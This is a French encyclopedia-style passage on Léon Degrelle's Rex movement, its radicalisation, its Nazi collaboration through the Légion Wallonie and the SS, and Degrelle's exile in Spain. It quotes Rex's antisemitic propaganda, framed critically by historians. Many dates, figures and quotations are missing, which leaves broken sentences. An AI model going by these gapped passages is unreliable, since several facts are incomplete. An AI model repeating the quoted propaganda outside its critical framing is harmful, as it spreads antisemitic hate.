Parmi les élus de Rex, on relève deux militants wallons notoires : Paul Collet, membre de l'Assemblée wallonne qui rompt avec Rex dès 1939, et Joseph Mignolet, écrivain d'expression wallonne, qui reste chef de Rex-Liège jusqu'en 1943 et qui participe dès lors activement à la collaboration intellectuelle au sein de la . Le , Degrelle signe avec Staf De Clercq un accord secret entre Rex et le Vlaamsch Nationaal Verbond (VNV), secret dévoilé dans "Le Soir" deux jours plus tard. "Le Pays réel" annonce que l'accord a été encouragé par le premier ministre Paul Van Zeeland et par le roi Léopold III, ce qui entraîne un démenti laconique et cinglant du secrétariat du souverain : .
Pour Els Witte et Jan Craeybeckx, cet accord était purement tactique entre un nationaliste flamand et un nationaliste belge, obligé cependant de composer avec la dualité foncière du pays. Selon ces auteurs, l'accord ne fut pas du goût des patriotes belges parmi lesquels Rex comptait de nombreux sympathisants. Pour les deux historiens, le succès de Rex . Quant aux véritables sentiments de Degrelle, ils ne furent jamais ceux d'un militant wallon. .
L'accord entre Rex et le VNV n'eut qu'une brève existence : il est suspendu par le VNV le , puis résilié le .
La chute et la radicalisation.
Après avoir préparé une marche sur Bruxelles interdite par les autorités, Degrelle annonce la participation de à la commémoration à Bruxelles, le , de la bataille de l'Yser. Cette annonce fracassante ne se traduit dans les faits que par la présence de trois à cinq mille rexistes et Degrelle termine la journée au poste de police. . Par contre, en , Degrelle organise au palais des sports de Bruxelles, les six jours de Rex ; bien que ces meetings soient payants, ils rassemblent chaque soir de douze à quinze mille personnes.
Fasciné par la conquête du pouvoir par Adolf Hitler au fil d'élections successives, il fait démissionner, en , le député rexiste bruxellois Alfred Olivier et tous les suppléants pour forcer une élection législative partielle anticipée, . La manœuvre de Degrelle qui espère affronter plusieurs candidats et diviser les votes est immédiatement déjouée : à l'initiative du parti socialiste, les trois composantes du gouvernement de coalition regroupant socialistes, catholiques et libéraux, décident de présenter un candidat unique, le premier ministre Paul Van Zeeland, qui reçoit même le soutien des communistes. Relativement courte, la campagne électorale des deux camps mobilise des moyens considérables et au slogan rexiste « Van Zeeland = Kerenski » s'oppose celui de « Rex=Hitler ». Lors de la campagne électorale, Degrelle commet l'erreur de déclarer que le silence du cardinal Van Roey, primat de l'Église catholique de Belgique, reflète la sympathie de l'Église envers la cause rexiste. Le , une déclaration épiscopale condamne fermement le vote rexiste et décourage l'abstention.
Le , Degrelle subit un revers face à Paul Van Zeeland : il n'obtient que , soit 19 %, contre , soit 76 % à son adversaire.
Outre les questions d'analyse électorale, ; il découle également de l'ambition démesurée de Degrelle qui n'a pas pris la mesure et les limites de son succès de 1936 et espère passer en un an de 18 à plus de 50 % des voix à Bruxelles. Si ce net recul est dû à la mobilisation contre Degrelle de tous les partis démocratiques, il provient aussi du départ de nombreux membres du mouvement, choqués par l'accord passé avec le VNV et par la radicalisation de Rex, de plus en plus ouvertement fasciste. L'échec électoral de 1937 et l'érosion du nombre de membres de Rex font perdre quasiment tout intérêt, aux yeux des Allemands, à la personne de Degrelle.
Cette radicalisation se marque par l'apparition de deux thèmes récurrents et nouveaux dans la presse rexiste : l'antisémitisme et le racisme d'une part et un pacifisme qui se singularise du neutralisme dominant dans les milieux politiques belges, d'autre part.
Dans "Rex" et "Le Pays réel", les attaques contre les Juifs et les étrangers se multiplient : à propos des Juifs, un article de "Rex" affirme qu'« ils ont envahi la Belgique en conquérants, se jetant avec avidité sur une terre propice au pillage » [et que les responsables de l'antisémitisme] « sont les Juifs eux-mêmes qui, par leurs exactions, leur outrecuidance, leur parasitisme social se sont rendus odieux dans maints pays qui avaient admis leur présence ». Léon Degrelle écrit que « leur génie s'éprend tout particulièrement de ce qui est malsain ». À Anvers, le , Degrelle déclare que « [pour] la défense du commerce, les Juifs doivent être mis au pas ou à la porte »; pour G.-F. di Muro, Léon Degrelle fit, « des années durant, de l'organe officiel du mouvement rexiste, un champion de l'antisémitisme le plus sournois, le plus nocif, celui qui se donne des allures rationnelles, à savoir l'antisémitisme économique ». "Le Pays réel" passe de l'antisémitisme à la xénophobie en titrant à la une, sur deux colonnes : « La Belgique aux Belges. Des milliers de Belges n'ont pas de travail et l'Internationale introduit chez nous des étrangers prêts à tous les sales coups ».
Face à l'expansion de l'Allemagne nazie, Degrelle manifeste son inquiétude pour le maintien de la neutralité, voire de l'indépendance de la Belgique : après l'invasion de la Tchécoslovaquie, il écrit dans "Le Pays réel" du : « Où Hitler s'arrêtera-t-il ?… Bruxelles n'est guère plus loin d'Aix-la-Chapelle que Prague ne l'était de Dresde ». Cette inquiétude ne l'empêche pas de considérer « la défaite tchèque [comme une] défaite terrible des Rouges en Europe » et que « malgré tout ce qu'on peut penser d'Hitler, on n'a pas le droit, en toute équité, d'oublier que si le communisme est maintenant refoulé à la frontière russe, c'est parce que les Chemises brunes l'y ont rejeté et parqué ». Fervent partisan des accords de Munich, Degrelle est persuadé que la même situation se reproduira pour la Pologne et que celle-ci ne résistera pas.
Lors des élections législatives du , si Degrelle est réélu député à Bruxelles, son parti ne retrouve que 4 de ses 21 députés et quatre de ses douze sénateurs. Contre les soit 11,5 % des votes en 1936, Rex n'obtient que , soit 4,43 %. De plus, Rex n'atteint des résultats significatifs que dans la province de Luxembourg, à Bruxelles et dans les arrondissements de Liège, Verviers et Dinant-Philippeville : dans le reste du pays, le mouvement est complètement marginalisé. « Aussi les élections de 1939 sont-elles réellement le signe de la fin du rexisme, le mouvement ne pouvant plus désormais que survivre difficilement à sa défaite ». Ce n'est qu'après cette déroute électorale que Degrelle tente de se débarrasser de sa réputation de pro-allemand, ce qui ne l'empêche pas de solliciter une nouvelle aide financière de l'Allemagne nazie en , requête partiellement acceptée par l'ambassadeur allemand à Bruxelles, mais qui ne se concrétisa pas. À la veille de la Seconde Guerre mondiale, « ses outrances de langage, ses inconséquences, ses mensonges répétés l'avaient déjà marginalisé ».
La guerre et la collaboration.
De la « drôle de guerre » au départ pour le front de l'Est.
La défense de la neutralité de la Belgique.
Pendant la drôle de guerre, Degrelle approuve la politique de neutralité de Léopold III, partageant sur ce point l'opinion de la majorité des hommes politiques belges. « Derrière les protestations de soutien au roi et au gouvernement » [...] « Degrelle attribue la responsabilité quasi entière des origines du conflit à la France et à la Grande-Bretagne, et plus spécialement aux forces occultes de la franc-maçonnerie et de la finance juive ». S'il condamne l'attaque de la Finlande par l'Union des républiques socialistes soviétiques, il applaudit à l'invasion de la Norvège qui est selon lui, le juste châtiment des Alliés, qui ont honteusement provoqué Hitler, déclaration qui entraîne la démission de deux députés rexistes. Contrairement à certaines accusations, les rexistes ne constituent pas une cinquième colonne et les deux affaires d'espionnage dont sont accusés des rexistes se révèlent illusoires. Après guerre, Degrelle affirme que « Rex ne fut [pendant la drôle de guerre] l'objet de la plus petite intervention, si discrète fut-elle, venant d'un Allemand ou d'un émissaire quelconque des Allemands », ce qui est paradoxalement exact puisque c'est Degrelle lui-même qui contacta les Allemands en afin d'obtenir un soutien pour créer un nouveau journal, "Le journal de Bruxelles". Il n'y a non plus, de la part des rexistes aucune tentative de démoralisation des troupes. Le mouvement rexiste survit difficilement pendant cette période, une bonne partie de ses cadres ayant été mobilisée, ce qui n'est pas le cas de Degrelle. Celui-ci demande à être incorporé dans l'aviation, pour laquelle il n'a aucune qualification particulière, mais cette demande est refusée par le ministère de la Défense nationale.
Captivité et retour en Belgique.
Le , le ministre de la Justice, Paul-Émile Janson ordonne, sur la base de la loi du relative à la défense des institutions nationales, l'arrestation de cinq à six mille personnes suspectées de former une cinquième colonne, parmi lesquels figurent des réfugiés juifs et allemands, des trotskistes, des anarchistes, des nationalistes flamands, des communistes fidèles au pacte germano-soviétique mais aussi des rexistes, dont Léon Degrelle. Les détenus sont transférés dans des prisons à l'ouest de la Belgique, puis en France. Dans la confusion générale et la panique suscitées par les succès allemands, les prisonniers belges sont considérés par leurs gardiens français comme des agents de l'ennemi et, le , à Abbeville dans le nord de la France, vingt et un d'entre eux, dont Joris Van Severen [...] et un vieux militant rexiste sont exécutés par des soldats français. Degrelle, que beaucoup pensent être au nombre des victimes, est séparé des autres prisonniers et incarcéré et interrogé, avec passage à tabac et simulacre d'exécution, à Dunkerque.
Son périple de prison en prison le mène notamment aux prisons de Lisieux et de Caen. Les mauvais traitements dont il fait l'objet dans les prisons françaises feront l'objet d'un jugement, et trois surveillants de prison normands feront office de boucs-émissaires. En effet, Degrelle est à nouveau passé à tabac lors de son passage à Caen en 1940 par trois gardiens : Georges Bihoreau, Pierre Laignel et Louis Philippe. Le , alors que la France a capitulé et après avoir porté plainte contre ceux-ci pour mauvais traitements, Degrelle obtiendra gain de cause devant un tribunal militaire allemand. À la suite des dépositions de leurs collègues, les deux premiers avouent, tandis que Louis Philippe refuse de se reconnaître coupable de tous les faits reprochés. Bihoreau sera condamné à trois ans de prison ferme qu'il purgera dans plusieurs prisons allemandes, Laignel à deux ans et demi, purgés à Sarrebruck et Francfort, et Philippe à deux ans. Les deux premiers reviendront vivants, tandis que Philippe, déporté le dans la prison-forteresse de Mannheim y meurt moins d'un an plus tard.
Degrelle est finalement localisé au camp du Vernet et libéré le . Après un passage à Paris, où il recherche le soutien des autorités allemandes via Otto Abetz, Degrelle rejoint Bruxelles le . Il y met fin aux tergiversations qui agitent les cadres du mouvement rexiste et engage résolument celui-ci dans la voie d'une collaboration avec le régime nazi : « il paraît peu probable que, sans son chef de file, Rex ait pu s'enfoncer si loin et si spectaculairement dans le bourbier de la collaboration ».
Les premières tentatives de collaboration.
Au cours du mois d', Degrelle recherche en vain le soutien du roi Léopold III, en rencontrant son secrétaire, le comte Capelle le ; et celui du cardinal Van Roey, mais il n'arrive pas à s'imposer dans la nouvelle donne politique en Belgique. . Cet . Degrelle s'attelle alors à relancer "Le Pays réel" et le mouvement rexiste, doté d'une organisation paramilitaire, les « Formations de combat », créée le et qui rassemble environ à la fin de l'année. Malgré ses efforts, ni Rex, ni "Le Pays réel" ne parviennent à trouver un large écho. Pour les occupants, Degrelle est considéré comme insignifiant. Ignoré, sur l'ordre de Goebbels, par la presse nazie, il est évité par les rares fonctionnaires allemands avec lesquels il parvient à entrer en contact. Alexander von Falkenhausen, gouverneur militaire de la Belgique occupée et responsable en titre de la refuse toute rencontre avec Degrelle. Pour son adjoint, Eggert Reeder, la stratégie de Degrelle relève d'une improvisation constante et pas toujours heureuse ("ein fortgesetzes, nicht immer glückliches Improvisieren") ; « ses déclarations pro-allemandes impulsives et ses promesses imprudentes de prendre bientôt le pouvoir ont aggravé les problèmes créés par le choix malheureux de ses conseillers et le traitement maladroit des rivalités personnelles ». Malgré le "Heil Hitler" à la fin de l'éditorial du "Pays réel" du et lors d'un meeting au Palais des Sports de Liège le , le seul résultat concret de la volonté de celui-ci de collaborer avec les autorités allemandes consiste en l'engagement de 300 volontaires au sein du NSKK, alors que Degrelle s'était fait fort de trouver . Cette prise de position entraîne en outre de nombreuses défections et « les sympathisants de la première heure, partisans de la politique prudente de 1940, laissent la place à des impatients pressés de se lancer dans une collaboration exaltée ».
Fin , Rex reste un groupement marginalisé en Belgique et ignoré par les autorités d'occupation : « En Belgique, il y aurait peut-être à faire le bilan de ce qui s'est passé depuis un an. Mais il ne s'est rien passé. […] On tue le temps en attendant que vienne enfin l'heure de l'action ».
La collaboration.
La Légion Wallonie.
Au sein de la Wehrmacht.
L'invasion de l'Union soviétique, le , permet aux rexistes de concrétiser leur volonté de collaboration. Pendant que Degrelle cherche le soutien d'Otto Abetz à Paris, dont la proche collaboratrice à Paris était l'une de ses cousines, son lieutenant Fernand Rouleau, prend contact avec la "Militärverwaltung" en lui proposant de constituer une unité de volontaires pour aller combattre sur le front de l'Est. Dès son retour à Bruxelles, Degrelle reprend l'idée à son compte et début juillet, Degrelle et Rouleau obtiennent l'accord des autorités allemandes, annoncé lors d'une réunion des Formations de combat le . Alors que mi-juillet, la première campagne de recrutement est un échec absolu, avec guère plus de 200 volontaires, Degrelle cherche à obtenir le soutien du roi Léopold III : malgré l'absence de réaction du monarque, approché lors d'une réunion entre l'envoyé de Degrelle, Pierre Daye, et le comte Capelle, Degrelle et Rouleau affirment que le souverain a approuvé la création de la Légion wallonie. Dans un premier temps, Degrelle ne semble pas avoir l'intention de partir pour le front, comme en témoigne son discours du : « Je voudrais être libre et avoir 20-25 ans comme vous autres. Jamais un tel avenir n'a été donné à la jeunesse... Je n'ai qu'une peur, c'est que vous arriviez quand il sera trop tard... Il semble que si j'étais dans votre cas, ce serait dans mon âme un déchirement terrible d'y manquer ». Mais, lors d'un rassemblement à Liège, le , Degrelle annonce qu'il s'engage dans la légion comme simple soldat. Ce sont finalement 850 volontaires, dont 730 militants rexistes, qui quittent Bruxelles pour un camp d'entraînement de Meseritz en Allemagne, le , sous la direction de Fernand Rouleau, le commandeur en titre de la légion étant un officier de l'armée belge, le major Jacobs. Degrelle a promis aux volontaires qu'ils porteraient un uniforme belge, seraient placés sous un commandement intégralement belge et seraient assurés d'être employés en seconde ligne, promesses qui sont rapidement démenties par les faits. Contrairement aux volontaires flamands de la "Vlaams Legioen", embryon de la future SS de grenadiers volontaires Langemarck, qui sont incorporés à la Waffen-SS, les membres de la légion Wallonie dépendent de la Wehrmacht.
Le conflit latent entre Degrelle et Rouleau éclate rapidement, Degrelle ne supportant pas les excellents contacts de Rouleau avec les officiers allemands et ses voyages à Berlin : fin , dans des circonstances peu claires, Rouleau quitte la Légion Wallonie et Rex et fin 1941, le major Jacobs, en conflit avec Degrelle est remplacé par le capitaine Pauly. Fin , malgré le manque de préparation de l'unité, Degrelle insiste, auprès du commandant des forces italiennes du secteur, le général Luigi di Michele, pour que la légion soit le plus vite possible envoyée sur le front. La reprise en main de la légion par Pauly, « qui fait preuve d'un réel déséquilibre mental » et « fait massacrer ses hommes en dépit du bon sens », suscite à nouveau un conflit avec Degrelle et conduit au remplacement de Pauly par le capitaine Georges Tchekhoff, russe exilé et ancien officier des armées blanches. Tchekhoff est assisté par le Lucien Lippert et par Léon Degrelle qui, malgré son grade d’"Oberfeldwebel" (adjudant-chef), se fait muter à l'état-major.
En , Degrelle, toujours sur le front, ordonne le lancement d'une nouvelle campagne de recrutement au sein de Rex. Il se rend également à Berlin pour examiner la possibilité de recruter au sein de la légion des prisonniers de guerre belges, dont seuls 140 s'engagent dans la légion. Le , 450 volontaires sont rassemblés sur la Grand-Place de Bruxelles. Parmi eux, des membres des Gardes wallonnes et 150 adolescents des Jeunesses rexistes, dont certains ne sont âgés que de 15 ou 16 ans, sous le commandement de John Hagemans, prévôt des Jeunesses rexistes et ancien membre du Verdinaso. Degrelle insiste personnellement pour que ces jeunes volontaires soient envoyés sur le front, alors que leur recrutement avait été présenté comme un « tour de propagande » qui devait se terminer avec la fin des vacances scolaires.
Faisant preuve d'un réel courage sur le front, Degrelle est décoré de la croix de fer et nommé "Feldwebel" (adjudant) en , après que la Légion a perdu 63 % de ses effectifs en résistant à une offensive russe. En , nouveau changement à la tête de la légion dont Lucien Lippert, avec qui Degrelle entretient d'excellents rapports, devient le commandeur. Durant l'année 1942, la légion ne connaît que peu de répit sur le sanglant front de l'est où elle est fréquemment à la pointe des offensives allemandes ; en octobre, malgré les renforts arrivés de Belgique, elle ne compte plus que deux cents hommes en état de combattre.
« En dix mois, Degrelle s'était vu confronté à une série de problèmes personnels, politiques et militaires. Usant d'une patience qui ne lui était pourtant pas coutumière, mais dictée par les impératifs du moment, à chaque fois, il était parvenu à redresser la situation à son avantage personnel ».
Au sein de la Waffen-SS.
Le , Degrelle prend contact avec le SS-Obergruppenführer Felix Steiner, commandant de la Panzerdivision SS Wiking afin de préparer l'intégration de la Légion Wallonie à la Waffen-SS. Afin de faciliter cette intégration, il donne l'ordre à son remplaçant à la tête de Rex en Belgique, Victor Matthys, de proclamer la germanité des Wallons, ce que fait celui-ci lors d'un discours, le . Avec le soutien de Felix Steiner, il se rend ensuite à Berlin pour obtenir l'accord des responsables allemands. Le , il rencontre plusieurs membres de l'entourage d'Heinrich Himmler, dont Gottlob Berger ; conscient de l'influence croissante de la SS au sein du régime nazi, « il a senti le parfum enivrant du pouvoir ». Dans la nuit du 23 au , Degrelle rencontre, pour la première fois, Himmler, rencontre dont il donne, dans ses écrits d'après-guerre, « un compte-rendu hautement extravagant » ; si Himmler fait quelques concessions mineures, comme le maintien des officiers et de l'aumônier catholique belge et du français comme langue de commandement, c'est Degrelle qui fait des concessions politiques majeures, en acceptant que le seul but de toute activité politique en Wallonie soit la préparation du retour de la race wallonne dans le "Reich", abandonnant ainsi de fait sa volonté de restaurer un empire bourguignon, proclamée lors d'un discours du . Le , la légion Wallonie passe dans les rangs de la Waffen-SS, sous la dénomination de "SS-Freiwilligen-Brigade Wallonien".
Courant novembre 43, Degrelle entre en conflit avec l'officier de liaison, le SS-Obersturmbannführer Albert Wegener et avec le successeur de Félix Steiner, le SS-Gruppenführer Herbert Otto Gille : pour ces deux officiers, il apparaît « que le niveau d'instruction au sein de l'unité n'autorise pas encore un engagement de type offensif ». Degrelle, au contraire, veut engager l'unité dans des actions offensives et ne pas la confiner dans des actions défensives sans éclat. En , lors de la bataille de Tcherkassy, Degrelle insiste auprès du général Gille pour participer à une offensive dans la forêt de Teklino : Degrelle avait fait fi de la réticence de Lippert, qui, mieux que quiconque, savait que la brigade n'était pas assez étoffée pour affronter les forces soviétiques retranchées dans la forêt. [...] Teklino était une sorte de quitte ou double. Échouer eût signifié voir la brigade absorbée complètement par la division Wiking avec à sa tête des officiers allemands. [...] La décision de Degrelle était un acte politique dans lequel Lippert n'intervint pas. Les combats sont particulièrement féroces du 18 au et Lippert trouve la mort sur le front le . Durant la bataille de Tcherkassy, Degrelle n'exerce pas de commandement militaire spécifique et est affecté comme officier à la , sans responsabilité particulière. Lors d'un dénombrement des effectifs, le , sur les de la brigade qui ont pris part à la bataille, seuls 632 sont encore en état de combattre.
Après un intérim assuré par le major Hellebaut, Degrelle est nommé "Kommandeur der SS Freiwillige Grenadier Brigade Wallonien" et promu SS-Hauptsturmführer, le .
Envoyé à Berlin par avion et célébré par la machine de propagande nazie, Degrelle, le , est reçu par Adolf Hitler qui le décore de la croix de chevalier de la croix de fer, une des plus hautes distinctions allemandes, lors « d'un entretien d'une heure au cours duquel aucun sujet d'importance n'est abordé ». Il s'agit de la deuxième rencontre entre les deux hommes, après celle du . « Entre les deux, en dépit de ce que raconte Degrelle, narrant à l'envi ses conversations multiples avec Hitler, c'est plus que le flou artistique, c'est le vide intégral. En tout cas vide de preuves. Quand on connaît la minutie administrative du Reich, particulièrement au plus haut niveau, quand on sait que chaque réception du Führer avec qui que ce soit faisait l'objet d'un compte-rendu détaillé, quand on sait enfin qu'aucune relation n'existe d'une visite de Degrelle à Hitler entre les deux citées, on est en droit de se demander s'il y en eut réellement une seule entre ces deux là, s'il n'y a pas là une vaste mythomanie, un puissant besoin de prendre ses désirs pour des réalités. [...] Ajoutons-y cette étrange vérité : Degrelle n'a jamais su parler allemand ».
Après son séjour à Berlin, Degrelle fait son retour en Belgique. Le , il prend la parole lors d'une réunion organisée en toute hâte au Palais des Sports de Bruxelles : la grande salle est pleine et, « au milieu d'acclamations sincères mais disciplinées, Degrelle prononce, avec sa verve habituelle, un discours qui ne contient que des expressions de fidélité éternelle à la cause nazie ».
Le 5 mars 1944, Léon Degrelle s'adresse à la LVF lors d'un meeting à Paris où Fernand De Brinon, Jacques Doriot, Marcel Déat, Joseph Darnand et Otto Abetz font partie de l'assistance. Lors de son discours, il fait référence à Charles Maurras sans le nommer, lui reprochant de ne pas adhérer au projet européen nazi.
Après d'autres meetings à Charleroi, à Liège, c'est la consécration : le , les légionnaires survivants de la bataille de Tcherkassy, en tenue de combat, se rassemblent sur la Place de la Ville-Haute de Charleroi, où certains d'entre eux sont décorés par Sepp Dietrich, commandant le SS-Panzer Korps. À bord de véhicules prêtés par la SS Panzerdivision « Hitlerjugend », ils paradent ensuite à Bruxelles : « triomphant, accompagné de ses jeunes enfants, Degrelle arbore un large sourire, juché sur un blindé, à la tête de ses hommes ». Ce défilé d'une unité collaborationniste en tenue de combat dans sa patrie d'origine est un élément unique en Europe occupée.
Lors de sa dernière rencontre avec Hitler, le , il reçoit la croix de chevalier de la croix de fer avec feuilles de chêne. Après la guerre, Degrelle prétend que Hitler lui aurait dit : « Si j'avais eu un fils, j'aurais aimé qu'il fût comme vous ». Cette affirmation est contestée par Jean-Marie Frérotte qui souligne que Degrelle « n'a jamais fait état de cette réflexion du vivant d'Hitler, comme s'il avait pu redouter un démenti cinglant » et selon qui Degrelle aurait déclaré en sortant de l'entrevue : J'ai « vu dans ses yeux qu'il me regardait comme son fils ». Selon Alain Colignon, mi 1944, Degrelle, « pour ses protecteurs nazis, demeurait un instrument de propagande, apte à jouer le rôle d'un agent recruteur pour le front oriental et à pourvoir le collaborationnisme francophone d'une face avenante. Les conseillers du Führer envisageaient bien de l'utiliser, sous contrôle, à la tête d'un "Reichsgau" wallon, dans la perspective d'une annexion imminente. » Lors d'une rencontre entre Hitler et Himmler, le , au cours de laquelle est évoqué le remplacement de la "Militärverwaltung" par une administration civile, le chef de la SS ne propose aucun rôle pour Degrelle et en parle en des termes peu élogieux, critiquant son manque de sérieux politique par rapport aux collaborateurs flamands. Pour les dirigeants de la SS, Degrelle manque de crédibilité en tant que futur dirigeant politique d'importance.
Promu SS-Sturmbannführer en , Degrelle est à la tête d'une brigade de , loin des pour constituer une division : « Techniquement, cette division était impossible à mettre sur pied. Degrelle [...] s'en souciait peu, la reconnaissance sur le papier et le titre de commandeur lui suffisant. » La campagne de recrutement menée par Degrelle au cours de l'été 1944 auprès des travailleurs belges en Allemagne ne rencontre qu'un maigre succès.
Lors de la bataille des Ardennes, Degrelle, qui espère participer à la « libération » de la Belgique, est cantonné à l'arrière du front avec un petit détachement motorisé et ne prend aucune part aux combats.
Nommé "Volksführer der Wallonen" (chef des Wallons) par Hitler le , il reçoit, le , « les pleins pouvoirs pour les affaires civiles, politiques et militaires pour les Wallons séjournant dans les territoires occupés par les troupes allemandes » et décrète aussitôt la mobilisation des classes 1924 et 1925 pour tous les ressortissants belges qui se trouvent sur le territoire du Reich.
La SS Wallonie participe à sa dernière campagne en Poméranie en , avec un seul régiment opérationnel, dont « les hommes se battirent avec un héroïsme et un courage indéniables face à une suprématie écrasante en matériel et en effectifs. » La dernière unité constituée, qui ne compte plus que deux cents hommes, se rend aux Américains à Schwerin, le .
Degrelle affirme avoir rencontré Himmler, par hasard, le , et à cette occasion, avoir été nommé verbalement au grade de SS-Oberführer.
« Limitées dans le temps et dans l'espace, l'action et l'existence de la Légion Wallonie n'avait pas d'autre raison d'être que celle de servir les desseins politiques de Léon Degrelle en Belgique ».
La collaboration rexiste en Belgique.
À partir de son départ pour la Légion Wallonie, Degrelle délaisse de plus en plus les activités de Rex en Belgique. Le , il désigne Victor Matthys pour diriger Rex en son absence, avec José Streel, comme conseiller politique.
Durant l'automne 1941, la militarisation de Rex s'accentue avec la création des Gardes wallonnes, intégrées à la Wehrmacht, notamment chargées de garder des sites stratégiques dans la zone de juridiction de la "Militärverwaltung".
Degrelle revient de temps à autre en Belgique. Son discours du au Palais des sports de Bruxelles constitue, selon Martin Conway, le point culminant de la collaboration : marqué par « une fresque éclatante de l'héritage germanique supposé de la Wallonie », évasif sur les futures relations entre celle-ci et l'Allemagne, ce discours ôte toute limite à la collaboration ; pour Degrelle, « la politique nazie sera, par définition, aussi celle de la Wallonie et le peuple wallon devra une fidélité inconditionnelle aux leaders du Reich; » Cette adhésion inconditionnelle au nazisme entraîne le départ de nombreux militants rexistes. « Le discours du est également synonyme de rupture pour Rex qui cesse d'être un mouvement authentiquement belge pour devenir une excroissance du national-socialisme allemand. [...] Bien qu'il en demeure le leader incontesté, Léon Degrelle ne s'intéresse plus beaucoup aux développements de l'organisation rexiste en Belgique. [...] Léon Degrelle devient ainsi un aventurier solitaire à la recherche de miettes de prestige et de pouvoir dans un Reich de plus en plus décadent ».
Le , il provoque un grave incident, lors de la messe dominicale en l'église Saint-Charles de Bouillon, lorsque la communion lui est refusée alors qu'il porte l'uniforme allemand. Degrelle et quelques rexistes séquestrent le doyen, l'abbé Michel Poncelet, pendant plusieurs heures dans la cave à vin de la maison familiale et l'ecclésiastique est finalement libéré par les Allemands. Cette voie de fait lui vaut d'être excommunié, sentence qui est levée sur le front en novembre 43.
Si courant 1943, Degrelle se tient à distance des activités du mouvement, il apparaît à plusieurs rassemblements rexistes lors desquels . Cela ne l'empêche pas d'ambitionner de donner à Rex et à lui-même un rôle prépondérant en Belgique : fin 1943, il écrit à Adolf Hitler pour dénoncer la politique anti-nazie du responsable de la "Militärverwaltung", Reeder, et pour proposer au Führer de placer la Belgique sous administration civile et d'y nommer un "Höherer SS- und Polizeiführer". Si rien n'atteste que Hitler ait reçu la lettre, Reeder en reçoit lui une copie, ce qui lui fournit l'occasion, une fois de plus de marquer sa défiance à l'égard de Degrelle, qui peu de temps auparavant, lui avait envoyé une lettre de louanges et un grand bouquet de fleurs : dans un courrier à Wilhelm Keitel, Reeder dénonce l'inconstance intellectuelle et la fantaisie ("geistigen Beweglichkeit und Phantasie") de Degrelle. Le projet de Degrelle n'aboutit pas et le , il quitte à nouveau la Belgique pour le camp d'entraînement de la Légion, puis pour le front de l'est.
Au printemps 1944, Degrelle tente de relancer un mouvement rexiste en Flandre. Reeder interdit immédiatement les rassemblements pro-Degrelle en Flandre et adresse à ses supérieurs à Berlin un rapport cinglant.
Afin de favoriser le recrutement de soldats pour la SS Wallonie parmi les travailleurs belges en Allemagne, Degrelle ordonne, dans le courant de l'été 1944, à Victor Matthys, de dresser une liste de , liste à transmettre aux autorités allemandes afin de faciliter la déportation des ouvriers au sein du Reich. Seuls six à sept mille individus sont répertoriés et les listes ne sont pas transmises aux Allemands en raison de l'avance alliée.
Le , Édouard Degrelle, le frère de Léon, pharmacien à Bouillon est assassiné par des résistants, alors qu'il ne joue qu'un rôle tout à fait secondaire dans le mouvement rexiste. À titre de représailles, le lendemain, trois rexistes assassinent un pharmacien bouillonnais, et sont brièvement arrêtés par la police allemande. Revenu en Belgique à l'annonce du meurtre de son frère, le , Léon Degrelle réclame à Heinrich Himmler l'exécution immédiate de 100 otages et désigne personnellement trois otages supplémentaires aux personnes déjà arrêtées. Les trois otages désignés par Degrelle sont abattus par la police allemande le . S'il informe Himmler « qu'il est de son devoir de rester auprès de ses hommes en Belgique », cela ne l'empêche pas de se rendre à Paris puis de quitter Bruxelles pour rejoindre le front en Estonie. Le , il écrit à Matthys et l'assure « qu'un renversement de situation reste possible ». Réfugiés en Allemagne, Degrelle, Matthys et son adjoint, Louis Collard, mettent officiellement fin à l'existence du mouvement rexiste, le .
En Belgique, les rexistes sont l'objet de fréquentes attaques de la Résistance et nombre d'entre eux sont abattus, le phénomène s'amplifiant en 1944. Rex crée, après les « Formations de combat » et les « Gardes Wallonnes », de nouvelles unités comme le « Département Sécurité et Information », en mars 1943, et les « Formations B », début 1944, qui s'engagent activement dans la lutte contre les résistants ou supposés tels mais aussi dans des actions de pur banditisme. La campagne de terreur rexiste débute ouvertement avec l'assassinat du gouverneur de la province de Namur, le libéral et franc-maçon François Bovesse, le . Le l'exécution par la Résistance d'Oswald Englebin, bourgmestre rexiste du Grand Charleroi, dont la femme et le fils périssent dans l'attentat, entraîne des représailles des membres des Formations B qui commettent la « tuerie de Courcelles », du 17 au , faisant 27 victimes. À Bruxelles, ils assassinent le bâtonnier de l'ordre des avocats Louis Braffort.
L'exil et la construction du mythe.
Exil en Espagne.
Condamné à mort par contumace par le Conseil de guerre de Bruxelles, le , Degrelle gagne, fin , le Danemark puis la Norvège, deux pays toujours sous contrôle allemand ; il atteint Oslo, où il réquisitionne un bombardier bimoteur Heinkel 111, et il finit, après avoir survolé une grande partie de l'Europe, par atterrir en catastrophe sur une plage de Saint-Sébastien dans le nord de l'Espagne. Sa présence embarrasse le régime de Francisco Franco, qui héberge déjà Pierre Laval. Un correspondant de guerre belge, R. A. Francotte, lui rend visite à l'hôpital où il constate qu'il est sévèrement gardé. Lors de cette rencontre, Degrelle affirme qu'il est prêt à revenir en Belgique pour y être jugé, à condition qu'une amnistie totale soit accordée aux anciens combattants du front de l'Est, qu'il puisse s'y présenter « revêtu de son glorieux uniforme à cocarde belge, porteur des décorations gagnées au front » et qu'il assure sa défense lui-même, le procès devant recevoir une large publicité dans la presse et à la radio.
Le chargé d'affaires de Belgique en Espagne, Jacques De Thier, entame dès 1946 des négociations avec les autorités espagnoles pour le refoulement de Degrelle vers la France ou Gibraltar, sa livraison aux Nations unies ou aux autorités d'occupation en Allemagne, alors qu'une demande d'extradition doit encore être examinée par la justice espagnole. Ces tentatives échouent en raison du manque de soutien des gouvernements et diplomates britanniques et américains et des réticences du ministre espagnol des affaires étrangères qui estime « que depuis l'affaire Laval, nous ne devons plus livrer d'autres prisonniers politiques ». Le , les autorités espagnoles font savoir à De Thier que « le Conseil d'État est opposé à l'extradition, [parce que] les crimes qui sont imputés à Degrelle sont politiques ou connexes à une activité politique ». Cette réponse suscite un violent discours du ministre belge des affaires étrangères, Paul-Henri Spaak, le , au cours duquel il réitère sa demande d'extradition et menace de porter l'affaire devant le Conseil de sécurité des Nations unies, ce qui est fait dans les jours qui suivent. Dans un climat de plus en plus tendu, le gouvernement espagnol accepte de régler l'affaire Degrelle à trois conditions : la Belgique doit retirer sa plainte devant l'ONU, donner l'assurance que Degrelle serait jugé conformément aux lois et déclarer que le règlement de l'affaire Degrelle contribuerait à rétablir des relations diplomatiques normales avec l'Espagne. Pour Spaak, ces trois conditions sont inacceptables : « il est indécent de nous demander une assurance que Degrelle sera jugé conformément aux lois » et il n'accepte « pas de marchandage entre la livraison de Degrelle et la reprise des relations normales avec l'Espagne ».
